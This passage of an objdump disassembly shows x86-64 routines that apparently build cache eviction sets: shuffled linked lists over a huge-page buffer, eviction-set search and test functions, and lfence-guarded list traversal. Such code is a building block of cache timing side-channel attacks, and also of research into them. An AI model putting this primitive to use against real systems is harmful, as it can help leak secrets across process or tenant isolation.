    2bd6:	48 8b 00             	mov    (%rax),%rax
    2bd9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2bdd:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2be4:	00 
    2be5:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2bea:	75 17                	jne    2c03 <list_get+0x3d>
    2bec:	b8 00 00 00 00       	mov    $0x0,%eax
    2bf1:	eb 33                	jmp    2c26 <list_get+0x60>
    2bf3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2bf7:	48 8b 00             	mov    (%rax),%rax
    2bfa:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2bfe:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2c03:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c08:	74 0d                	je     2c17 <list_get+0x51>
    2c0a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c0e:	48 8b 00             	mov    (%rax),%rax
    2c11:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2c15:	72 dc                	jb     2bf3 <list_get+0x2d>
    2c17:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c1b:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    2c1f:	48 89 10             	mov    %rdx,(%rax)
    2c22:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c26:	5d                   	pop    %rbp
    2c27:	c3                   	ret

0000000000002c28 <list_take>:
    2c28:	55                   	push   %rbp
    2c29:	48 89 e5             	mov    %rsp,%rbp
    2c2c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2c30:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    2c34:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2c38:	48 8b 00             	mov    (%rax),%rax
    2c3b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2c3f:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2c46:	00 
    2c47:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c4c:	75 1a                	jne    2c68 <list_take+0x40>
    2c4e:	b8 00 00 00 00       	mov    $0x0,%eax
    2c53:	e9 9b 00 00 00       	jmp    2cf3 <list_take+0xcb>
    2c58:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c5c:	48 8b 00             	mov    (%rax),%rax
    2c5f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2c63:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2c68:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c6d:	74 0d                	je     2c7c <list_take+0x54>
    2c6f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2c73:	48 8b 00             	mov    (%rax),%rax
    2c76:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2c7a:	72 dc                	jb     2c58 <list_take+0x30>
    2c7c:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2c81:	75 07                	jne    2c8a <list_take+0x62>
    2c83:	b8 00 00 00 00       	mov    $0x0,%eax
    2c88:	eb 69                	jmp    2cf3 <list_take+0xcb>
    2c8a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c8e:	48 8b 00             	mov    (%rax),%rax
    2c91:	48 85 c0             	test   %rax,%rax
    2c94:	74 13                	je     2ca9 <list_take+0x81>
    2c96:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2c9a:	48 8b 00             	mov    (%rax),%rax
    2c9d:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2ca1:	48 8b 52 08          	mov    0x8(%rdx),%rdx
    2ca5:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2ca9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cad:	48 8b 40 08          	mov    0x8(%rax),%rax
    2cb1:	48 85 c0             	test   %rax,%rax
    2cb4:	74 14                	je     2cca <list_take+0xa2>
    2cb6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cba:	48 8b 40 08          	mov    0x8(%rax),%rax
    2cbe:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2cc2:	48 8b 12             	mov    (%rdx),%rdx
    2cc5:	48 89 10             	mov    %rdx,(%rax)
    2cc8:	eb 0e                	jmp    2cd8 <list_take+0xb0>
    2cca:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cce:	48 8b 10             	mov    (%rax),%rdx
    2cd1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2cd5:	48 89 10             	mov    %rdx,(%rax)
    2cd8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cdc:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    2ce3:	00 
    2ce4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2ce8:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2cef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2cf3:	5d                   	pop    %rbp
    2cf4:	c3                   	ret

0000000000002cf5 <list_shuffle>:
    2cf5:	55                   	push   %rbp
    2cf6:	48 89 e5             	mov    %rsp,%rbp
    2cf9:	48 83 ec 30          	sub    $0x30,%rsp
    2cfd:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2d01:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d05:	48 8b 00             	mov    (%rax),%rax
    2d08:	48 85 c0             	test   %rax,%rax
    2d0b:	0f 84 06 01 00 00    	je     2e17 <list_shuffle+0x122>
    2d11:	bf 08 00 00 00       	mov    $0x8,%edi
    2d16:	e8 c5 e3 ff ff       	call   10e0 <malloc@plt>
    2d1b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    2d1f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2d23:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2d2a:	48 c7 45 e8 ff ff ff 	movq   $0xffffffffffffffff,-0x18(%rbp)
    2d31:	ff 
    2d32:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    2d36:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d3a:	48 89 d6             	mov    %rdx,%rsi
    2d3d:	48 89 c7             	mov    %rax,%rdi
    2d40:	e8 81 fe ff ff       	call   2bc6 <list_get>
    2d45:	48 8b 05 fc 33 00 00 	mov    0x33fc(%rip),%rax        # 6148 <lfsr>
    2d4c:	48 85 c0             	test   %rax,%rax
    2d4f:	75 60                	jne    2db1 <list_shuffle+0xbc>
    2d51:	e8 0b fa ff ff       	call   2761 <lfsr_create>
    2d56:	48 89 05 eb 33 00 00 	mov    %rax,0x33eb(%rip)        # 6148 <lfsr>
    2d5d:	eb 52                	jmp    2db1 <list_shuffle+0xbc>
    2d5f:	48 8d 05 e2 33 00 00 	lea    0x33e2(%rip),%rax        # 6148 <lfsr>
    2d66:	48 89 c7             	mov    %rax,%rdi
    2d69:	e8 05 fa ff ff       	call   2773 <lfsr_rand>
    2d6e:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    2d72:	48 8d 4e ff          	lea    -0x1(%rsi),%rcx
    2d76:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
    2d7a:	ba 00 00 00 00       	mov    $0x0,%edx
    2d7f:	48 f7 f6             	div    %rsi
    2d82:	48 89 d1             	mov    %rdx,%rcx
    2d85:	48 89 c8             	mov    %rcx,%rax
    2d88:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    2d8c:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
    2d90:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2d94:	48 89 d6             	mov    %rdx,%rsi
    2d97:	48 89 c7             	mov    %rax,%rdi
    2d9a:	e8 89 fe ff ff       	call   2c28 <list_take>
    2d9f:	48 89 c2             	mov    %rax,%rdx
    2da2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2da6:	48 89 d6             	mov    %rdx,%rsi
    2da9:	48 89 c7             	mov    %rax,%rdi
    2dac:	e8 e3 fc ff ff       	call   2a94 <list_append>
    2db1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2db5:	48 85 c0             	test   %rax,%rax
    2db8:	75 a5                	jne    2d5f <list_shuffle+0x6a>
    2dba:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dbe:	48 8b 00             	mov    (%rax),%rax
    2dc1:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2dc5:	eb 17                	jmp    2dde <list_shuffle+0xe9>
    2dc7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2dcb:	48 89 c7             	mov    %rax,%rdi
    2dce:	e8 7d f8 ff ff       	call   2650 <my_access>
    2dd3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2dd7:	48 8b 00             	mov    (%rax),%rax
    2dda:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2dde:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2de2:	48 8b 00             	mov    (%rax),%rax
    2de5:	48 85 c0             	test   %rax,%rax
    2de8:	75 dd                	jne    2dc7 <list_shuffle+0xd2>
    2dea:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dee:	48 8b 10             	mov    (%rax),%rdx
    2df1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2df5:	48 89 10             	mov    %rdx,(%rax)
    2df8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2dfc:	48 8b 00             	mov    (%rax),%rax
    2dff:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2e03:	48 89 50 08          	mov    %rdx,0x8(%rax)
    2e07:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2e0b:	48 8b 10             	mov    (%rax),%rdx
    2e0e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    2e12:	48 89 10             	mov    %rdx,(%rax)
    2e15:	eb 01                	jmp    2e18 <list_shuffle+0x123>
    2e17:	90                   	nop
    2e18:	c9                   	leave
    2e19:	c3                   	ret

0000000000002e1a <list_print>:
    2e1a:	55                   	push   %rbp
    2e1b:	48 89 e5             	mov    %rsp,%rbp
    2e1e:	48 83 ec 20          	sub    $0x20,%rsp
    2e22:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    2e26:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    2e2b:	74 7f                	je     2eac <list_print+0x92>
    2e2d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2e31:	48 8b 00             	mov    (%rax),%rax
    2e34:	48 85 c0             	test   %rax,%rax
    2e37:	74 76                	je     2eaf <list_print+0x95>
    2e39:	48 8d 05 50 13 00 00 	lea    0x1350(%rip),%rax        # 4190 <_IO_stdin_used+0x190>
    2e40:	48 89 c7             	mov    %rax,%rdi
    2e43:	e8 f8 e1 ff ff       	call   1040 <puts@plt>
    2e48:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    2e4f:	00 
    2e50:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    2e54:	48 8b 00             	mov    (%rax),%rax
    2e57:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2e5b:	eb 46                	jmp    2ea3 <list_print+0x89>
    2e5d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2e61:	48 8b 08             	mov    (%rax),%rcx
    2e64:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    2e69:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    2e6d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    2e71:	48 89 c6             	mov    %rax,%rsi
    2e74:	48 8d 05 30 13 00 00 	lea    0x1330(%rip),%rax        # 41ab <_IO_stdin_used+0x1ab>
    2e7b:	48 89 c7             	mov    %rax,%rdi
    2e7e:	b8 00 00 00 00       	mov    $0x0,%eax
    2e83:	e8 08 e2 ff ff       	call   1090 <printf@plt>
    2e88:	48 8b 05 91 32 00 00 	mov    0x3291(%rip),%rax        # 6120 <conf>
    2e8f:	48 8b 00             	mov    (%rax),%rax
    2e92:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    2e96:	73 1a                	jae    2eb2 <list_print+0x98>
    2e98:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2e9c:	48 8b 00             	mov    (%rax),%rax
    2e9f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    2ea3:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    2ea8:	75 b3                	jne    2e5d <list_print+0x43>
    2eaa:	eb 07                	jmp    2eb3 <list_print+0x99>
    2eac:	90                   	nop
    2ead:	eb 04                	jmp    2eb3 <list_print+0x99>
    2eaf:	90                   	nop
    2eb0:	eb 01                	jmp    2eb3 <list_print+0x99>
    2eb2:	90                   	nop
    2eb3:	c9                   	leave
    2eb4:	c3                   	ret

0000000000002eb5 <init_evset>:
    2eb5:	55                   	push   %rbp
    2eb6:	48 89 e5             	mov    %rsp,%rbp
    2eb9:	48 83 ec 10          	sub    $0x10,%rsp
    2ebd:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2ec1:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    2ec6:	e8 47 f8 ff ff       	call   2712 <wait>
    2ecb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2ecf:	48 89 05 4a 32 00 00 	mov    %rax,0x324a(%rip)        # 6120 <conf>
    2ed6:	48 c7 05 57 32 00 00 	movq   $0x400000,0x3257(%rip)        # 6138 <buffer_size>
    2edd:	00 00 40 00 
    2ee1:	48 8b 05 50 32 00 00 	mov    0x3250(%rip),%rax        # 6138 <buffer_size>
    2ee8:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    2eee:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    2ef4:	b9 22 00 04 00       	mov    $0x40022,%ecx
    2ef9:	ba 03 00 00 00       	mov    $0x3,%edx
    2efe:	48 89 c6             	mov    %rax,%rsi
    2f01:	bf 00 00 00 00       	mov    $0x0,%edi
    2f06:	e8 75 e1 ff ff       	call   1080 <mmap@plt>
    2f0b:	48 89 05 1e 32 00 00 	mov    %rax,0x321e(%rip)        # 6130 <buffer>
    2f12:	48 8b 05 17 32 00 00 	mov    0x3217(%rip),%rax        # 6130 <buffer>
    2f19:	ba 0e 00 00 00       	mov    $0xe,%edx
    2f1e:	be 00 00 20 00       	mov    $0x200000,%esi
    2f23:	48 89 c7             	mov    %rax,%rdi
    2f26:	e8 e5 e1 ff ff       	call   1110 <madvise@plt>
    2f2b:	83 f8 ff             	cmp    $0xffffffff,%eax
    2f2e:	75 14                	jne    2f44 <init_evset+0x8f>
    2f30:	48 8d 05 81 12 00 00 	lea    0x1281(%rip),%rax        # 41b8 <_IO_stdin_used+0x1b8>
    2f37:	48 89 c7             	mov    %rax,%rdi
    2f3a:	e8 01 e1 ff ff       	call   1040 <puts@plt>
    2f3f:	e9 85 00 00 00       	jmp    2fc9 <init_evset+0x114>
    2f44:	48 8d 05 e5 31 00 00 	lea    0x31e5(%rip),%rax        # 6130 <buffer>
    2f4b:	48 89 05 ee 31 00 00 	mov    %rax,0x31ee(%rip)        # 6140 <buffer_ptr>
    2f52:	48 8b 15 df 31 00 00 	mov    0x31df(%rip),%rdx        # 6138 <buffer_size>
    2f59:	48 8b 05 d0 31 00 00 	mov    0x31d0(%rip),%rax        # 6130 <buffer>
    2f60:	48 89 d6             	mov    %rdx,%rsi
    2f63:	48 89 c7             	mov    %rax,%rdi
    2f66:	e8 55 f9 ff ff       	call   28c0 <list_init>
    2f6b:	48 8b 05 ae 31 00 00 	mov    0x31ae(%rip),%rax        # 6120 <conf>
    2f72:	48 8b 00             	mov    (%rax),%rax
    2f75:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    2f7c:	00 
    2f7d:	48 8b 05 a4 31 00 00 	mov    0x31a4(%rip),%rax        # 6128 <evsets>
    2f84:	48 89 d6             	mov    %rdx,%rsi
    2f87:	48 89 c7             	mov    %rax,%rdi
    2f8a:	e8 61 e1 ff ff       	call   10f0 <realloc@plt>
    2f8f:	48 89 05 92 31 00 00 	mov    %rax,0x3192(%rip)        # 6128 <evsets>
    2f96:	48 8b 05 8b 31 00 00 	mov    0x318b(%rip),%rax        # 6128 <evsets>
    2f9d:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    2fa4:	48 8b 15 85 31 00 00 	mov    0x3185(%rip),%rdx        # 6130 <buffer>
    2fab:	48 8b 05 76 31 00 00 	mov    0x3176(%rip),%rax        # 6128 <evsets>
    2fb2:	48 89 c6             	mov    %rax,%rsi
    2fb5:	48 8d 05 0c 12 00 00 	lea    0x120c(%rip),%rax        # 41c8 <_IO_stdin_used+0x1c8>
    2fbc:	48 89 c7             	mov    %rax,%rdi
    2fbf:	b8 00 00 00 00       	mov    $0x0,%eax
    2fc4:	e8 c7 e0 ff ff       	call   1090 <printf@plt>
    2fc9:	c9                   	leave
    2fca:	c3                   	ret

0000000000002fcb <find_evset>:
    2fcb:	55                   	push   %rbp
    2fcc:	48 89 e5             	mov    %rsp,%rbp
    2fcf:	48 83 ec 30          	sub    $0x30,%rsp
    2fd3:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2fd7:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
    2fdb:	48 8b 05 76 31 00 00 	mov    0x3176(%rip),%rax        # 6158 <msrmts>
    2fe2:	48 85 c0             	test   %rax,%rax
    2fe5:	74 1a                	je     3001 <find_evset+0x36>
    2fe7:	48 8b 05 6a 31 00 00 	mov    0x316a(%rip),%rax        # 6158 <msrmts>
    2fee:	48 89 c7             	mov    %rax,%rdi
    2ff1:	e8 3a e0 ff ff       	call   1030 <free@plt>
    2ff6:	48 c7 05 57 31 00 00 	movq   $0x0,0x3157(%rip)        # 6158 <msrmts>
    2ffd:	00 00 00 00 
    3001:	48 8b 05 50 31 00 00 	mov    0x3150(%rip),%rax        # 6158 <msrmts>
    3008:	be 40 1f 00 00       	mov    $0x1f40,%esi
    300d:	48 89 c7             	mov    %rax,%rdi
    3010:	e8 db e0 ff ff       	call   10f0 <realloc@plt>
    3015:	48 89 05 3c 31 00 00 	mov    %rax,0x313c(%rip)        # 6158 <msrmts>
    301c:	48 8d 05 d4 11 00 00 	lea    0x11d4(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    3023:	48 89 c7             	mov    %rax,%rdi
    3026:	e8 15 e0 ff ff       	call   1040 <puts@plt>
    302b:	48 8b 05 fe 30 00 00 	mov    0x30fe(%rip),%rax        # 6130 <buffer>
    3032:	48 85 c0             	test   %rax,%rax
    3035:	74 0c                	je     3043 <find_evset+0x78>
    3037:	48 8b 05 ea 30 00 00 	mov    0x30ea(%rip),%rax        # 6128 <evsets>
    303e:	48 85 c0             	test   %rax,%rax
    3041:	75 25                	jne    3068 <find_evset+0x9d>
    3043:	48 8d 05 af 11 00 00 	lea    0x11af(%rip),%rax        # 41f9 <_IO_stdin_used+0x1f9>
    304a:	48 89 c7             	mov    %rax,%rdi
    304d:	e8 ee df ff ff       	call   1040 <puts@plt>
    3052:	b8 00 00 00 00       	mov    $0x0,%eax
    3057:	e8 e3 01 00 00       	call   323f <close_evsets>
    305c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    3060:	48 89 c7             	mov    %rax,%rdi
    3063:	e8 4d fe ff ff       	call   2eb5 <init_evset>
    3068:	bf 00 ca 9a 3b       	mov    $0x3b9aca00,%edi
    306d:	e8 a0 f6 ff ff       	call   2712 <wait>
    3072:	48 8d 05 7e 11 00 00 	lea    0x117e(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    3079:	48 89 c7             	mov    %rax,%rdi
    307c:	e8 bf df ff ff       	call   1040 <puts@plt>
    3081:	c7 45 fc ff 07 00 00 	movl   $0x7ff,-0x4(%rbp)
    3088:	e9 38 01 00 00       	jmp    31c5 <find_evset+0x1fa>
    308d:	48 8d 05 77 11 00 00 	lea    0x1177(%rip),%rax        # 420b <_IO_stdin_used+0x20b>
    3094:	48 89 c7             	mov    %rax,%rdi
    3097:	e8 a4 df ff ff       	call   1040 <puts@plt>
    309c:	48 8b 05 7d 30 00 00 	mov    0x307d(%rip),%rax        # 6120 <conf>
    30a3:	48 8b 00             	mov    (%rax),%rax
    30a6:	83 e8 01             	sub    $0x1,%eax
    30a9:	89 45 f8             	mov    %eax,-0x8(%rbp)
    30ac:	eb 5b                	jmp    3109 <find_evset+0x13e>
    30ae:	8b 45 fc             	mov    -0x4(%rbp),%eax
    30b1:	48 98                	cltq
    30b3:	8b 55 f8             	mov    -0x8(%rbp),%edx
    30b6:	48 63 d2             	movslq %edx,%rdx
    30b9:	48 c1 e2 0b          	shl    $0xb,%rdx
    30bd:	48 01 c2             	add    %rax,%rdx
    30c0:	b8 ff 07 00 00       	mov    $0x7ff,%eax
    30c5:	2b 45 fc             	sub    -0x4(%rbp),%eax
    30c8:	0f af 45 f8          	imul   -0x8(%rbp),%eax
    30cc:	48 98                	cltq
    30ce:	48 29 c2             	sub    %rax,%rdx
    30d1:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    30d5:	48 8b 05 64 30 00 00 	mov    0x3064(%rip),%rax        # 6140 <buffer_ptr>
    30dc:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
    30e0:	48 89 d6             	mov    %rdx,%rsi
    30e3:	48 89 c7             	mov    %rax,%rdi
    30e6:	e8 3d fb ff ff       	call   2c28 <list_take>
    30eb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    30ef:	48 8b 05 32 30 00 00 	mov    0x3032(%rip),%rax        # 6128 <evsets>
    30f6:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    30fa:	48 89 d6             	mov    %rdx,%rsi
    30fd:	48 89 c7             	mov    %rax,%rdi
    3100:	e8 8f f9 ff ff       	call   2a94 <list_append>
    3105:	83 6d f8 01          	subl   $0x1,-0x8(%rbp)
    3109:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
    310d:	79 9f                	jns    30ae <find_evset+0xe3>
    310f:	48 8d 05 f7 10 00 00 	lea    0x10f7(%rip),%rax        # 420d <_IO_stdin_used+0x20d>
    3116:	48 89 c7             	mov    %rax,%rdi
    3119:	e8 22 df ff ff       	call   1040 <puts@plt>
    311e:	48 8b 05 03 30 00 00 	mov    0x3003(%rip),%rax        # 6128 <evsets>
    3125:	48 89 c7             	mov    %rax,%rdi
    3128:	e8 c8 fb ff ff       	call   2cf5 <list_shuffle>
    312d:	48 8d 05 db 10 00 00 	lea    0x10db(%rip),%rax        # 420f <_IO_stdin_used+0x20f>
    3134:	48 89 c7             	mov    %rax,%rdi
    3137:	e8 04 df ff ff       	call   1040 <puts@plt>
    313c:	48 8b 05 0d 30 00 00 	mov    0x300d(%rip),%rax        # 6150 <msr_index>
    3143:	48 3d de 03 00 00    	cmp    $0x3de,%rax
    3149:	76 0b                	jbe    3156 <find_evset+0x18b>
    314b:	48 c7 05 fa 2f 00 00 	movq   $0x0,0x2ffa(%rip)        # 6150 <msr_index>
    3152:	00 00 00 00 
    3156:	48 8d 05 b4 10 00 00 	lea    0x10b4(%rip),%rax        # 4211 <_IO_stdin_used+0x211>
    315d:	48 89 c7             	mov    %rax,%rdi
    3160:	e8 db de ff ff       	call   1040 <puts@plt>
    3165:	48 8b 05 bc 2f 00 00 	mov    0x2fbc(%rip),%rax        # 6128 <evsets>
    316c:	48 8b 00             	mov    (%rax),%rax
    316f:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    3173:	48 89 d6             	mov    %rdx,%rsi
    3176:	48 89 c7             	mov    %rax,%rdi
    3179:	e8 31 02 00 00       	call   33af <test>
    317e:	48 85 c0             	test   %rax,%rax
    3181:	74 2f                	je     31b2 <find_evset+0x1e7>
    3183:	48 8b 05 9e 2f 00 00 	mov    0x2f9e(%rip),%rax        # 6128 <evsets>
    318a:	48 8b 00             	mov    (%rax),%rax
    318d:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    3191:	48 89 d6             	mov    %rdx,%rsi
    3194:	48 89 c7             	mov    %rax,%rdi
    3197:	e8 13 02 00 00       	call   33af <test>
    319c:	48 85 c0             	test   %rax,%rax
    319f:	75 30                	jne    31d1 <find_evset+0x206>
    31a1:	eb 0f                	jmp    31b2 <find_evset+0x1e7>
    31a3:	48 8b 05 7e 2f 00 00 	mov    0x2f7e(%rip),%rax        # 6128 <evsets>
    31aa:	48 89 c7             	mov    %rax,%rdi
    31ad:	e8 9f f9 ff ff       	call   2b51 <list_pop>
    31b2:	48 8b 05 6f 2f 00 00 	mov    0x2f6f(%rip),%rax        # 6128 <evsets>
    31b9:	48 8b 00             	mov    (%rax),%rax
    31bc:	48 85 c0             	test   %rax,%rax
    31bf:	75 e2                	jne    31a3 <find_evset+0x1d8>
    31c1:	83 6d fc 01          	subl   $0x1,-0x4(%rbp)
    31c5:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
    31c9:	0f 89 be fe ff ff    	jns    308d <find_evset+0xc2>
    31cf:	eb 01                	jmp    31d2 <find_evset+0x207>
    31d1:	90                   	nop
    31d2:	48 8d 05 1e 10 00 00 	lea    0x101e(%rip),%rax        # 41f7 <_IO_stdin_used+0x1f7>
    31d9:	48 89 c7             	mov    %rax,%rdi
    31dc:	e8 5f de ff ff       	call   1040 <puts@plt>
    31e1:	48 8b 05 40 2f 00 00 	mov    0x2f40(%rip),%rax        # 6128 <evsets>
    31e8:	c9                   	leave
    31e9:	c3                   	ret

00000000000031ea <del_evset>:
    31ea:	55                   	push   %rbp
    31eb:	48 89 e5             	mov    %rsp,%rbp
    31ee:	48 8b 05 33 2f 00 00 	mov    0x2f33(%rip),%rax        # 6128 <evsets>
    31f5:	48 85 c0             	test   %rax,%rax
    31f8:	74 22                	je     321c <del_evset+0x32>
    31fa:	eb 0f                	jmp    320b <del_evset+0x21>
    31fc:	48 8b 05 25 2f 00 00 	mov    0x2f25(%rip),%rax        # 6128 <evsets>
    3203:	48 89 c7             	mov    %rax,%rdi
    3206:	e8 46 f9 ff ff       	call   2b51 <list_pop>
    320b:	48 8b 05 16 2f 00 00 	mov    0x2f16(%rip),%rax        # 6128 <evsets>
    3212:	48 8b 00             	mov    (%rax),%rax
    3215:	48 85 c0             	test   %rax,%rax
    3218:	75 e2                	jne    31fc <del_evset+0x12>
    321a:	eb 01                	jmp    321d <del_evset+0x33>
    321c:	90                   	nop
    321d:	5d                   	pop    %rbp
    321e:	c3                   	ret

000000000000321f <get_evset>:
    321f:	55                   	push   %rbp
    3220:	48 89 e5             	mov    %rsp,%rbp
    3223:	48 8b 05 fe 2e 00 00 	mov    0x2efe(%rip),%rax        # 6128 <evsets>
    322a:	48 85 c0             	test   %rax,%rax
    322d:	75 07                	jne    3236 <get_evset+0x17>
    322f:	b8 00 00 00 00       	mov    $0x0,%eax
    3234:	eb 07                	jmp    323d <get_evset+0x1e>
    3236:	48 8b 05 eb 2e 00 00 	mov    0x2eeb(%rip),%rax        # 6128 <evsets>
    323d:	5d                   	pop    %rbp
    323e:	c3                   	ret

000000000000323f <close_evsets>:
    323f:	55                   	push   %rbp
    3240:	48 89 e5             	mov    %rsp,%rbp
    3243:	48 8b 05 de 2e 00 00 	mov    0x2ede(%rip),%rax        # 6128 <evsets>
    324a:	48 85 c0             	test   %rax,%rax
    324d:	74 1a                	je     3269 <close_evsets+0x2a>
    324f:	48 8b 05 d2 2e 00 00 	mov    0x2ed2(%rip),%rax        # 6128 <evsets>
    3256:	48 89 c7             	mov    %rax,%rdi
    3259:	e8 d2 dd ff ff       	call   1030 <free@plt>
    325e:	48 c7 05 bf 2e 00 00 	movq   $0x0,0x2ebf(%rip)        # 6128 <evsets>
    3265:	00 00 00 00 
    3269:	48 8b 05 c0 2e 00 00 	mov    0x2ec0(%rip),%rax        # 6130 <buffer>
    3270:	48 85 c0             	test   %rax,%rax
    3273:	74 19                	je     328e <close_evsets+0x4f>
    3275:	48 8b 15 bc 2e 00 00 	mov    0x2ebc(%rip),%rdx        # 6138 <buffer_size>
    327c:	48 8b 05 ad 2e 00 00 	mov    0x2ead(%rip),%rax        # 6130 <buffer>
    3283:	48 89 d6             	mov    %rdx,%rsi
    3286:	48 89 c7             	mov    %rax,%rdi
    3289:	e8 72 de ff ff       	call   1100 <munmap@plt>
    328e:	48 8b 05 8b 2e 00 00 	mov    0x2e8b(%rip),%rax        # 6120 <conf>
    3295:	48 85 c0             	test   %rax,%rax
    3298:	74 1a                	je     32b4 <close_evsets+0x75>
    329a:	48 8b 05 7f 2e 00 00 	mov    0x2e7f(%rip),%rax        # 6120 <conf>
    32a1:	48 89 c7             	mov    %rax,%rdi
    32a4:	e8 87 dd ff ff       	call   1030 <free@plt>
    32a9:	48 c7 05 6c 2e 00 00 	movq   $0x0,0x2e6c(%rip)        # 6120 <conf>
    32b0:	00 00 00 00 
    32b4:	90                   	nop
    32b5:	5d                   	pop    %rbp
    32b6:	c3                   	ret

00000000000032b7 <traverse_list0>:
    32b7:	55                   	push   %rbp
    32b8:	48 89 e5             	mov    %rsp,%rbp
    32bb:	48 83 ec 18          	sub    $0x18,%rsp
    32bf:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    32c3:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    32ca:	00 
    32cb:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    32cf:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    32d3:	eb 1a                	jmp    32ef <traverse_list0+0x38>
    32d5:	0f ae e8             	lfence
    32d8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32dc:	48 89 c7             	mov    %rax,%rdi
